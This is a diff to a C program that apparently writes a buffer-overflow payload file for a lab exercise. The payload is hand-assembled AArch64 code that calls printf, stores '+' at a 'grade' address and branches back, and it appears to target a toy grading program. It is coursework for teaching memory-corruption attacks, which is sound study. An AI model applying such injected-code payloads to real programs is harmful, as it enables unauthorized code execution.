@@ -33,12 +33,16 @@ int main(void){
    for (i = 0; i < 4; i++)
       putc(0x00, psFile); /* Writes '00000000' */
 
-   /* mov x0, 'A'   */
-   ulInstruction = MiniAssembler_movX(0, 65);
+   /* mov x1, 'A'   */
+   ulInstruction = MiniAssembler_movX(1, 65);
+   fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
+
+   /* adr x0, x1 */
+   ulInstruction = MiniAssembler_adr(0, 0x25, pAAttack + 4);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* bl printf     */
-   ulInstruction = MiniAssembler_bl(0x400690, pAAttack + 4);
+   ulInstruction = MiniAssembler_bl(0x400690, pAAttack + 8);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* mov w0, '+'   */
@@ -46,7 +50,7 @@ int main(void){
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* adr x1, grade */
-   ulInstruction = MiniAssembler_adr(1, 0x420044, pAAttack + 12);
+   ulInstruction = MiniAssembler_adr(1, 0x420044, pAAttack + 16);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* strb wo, [x1] */
@@ -54,11 +58,11 @@ int main(void){
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* b  printf     */
-   ulInstruction = MiniAssembler_b(0x40089c, pAAttack + 20);
+   ulInstruction = MiniAssembler_b(0x40089c, pAAttack + 24);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* Writes the null byte at the end of the instructions */
-   for (i = 0; i < 12; i++)
+   for (i = 0; i < 8; i++)
       putc(0x00, psFile); /* Writes '00000000' */
 
    
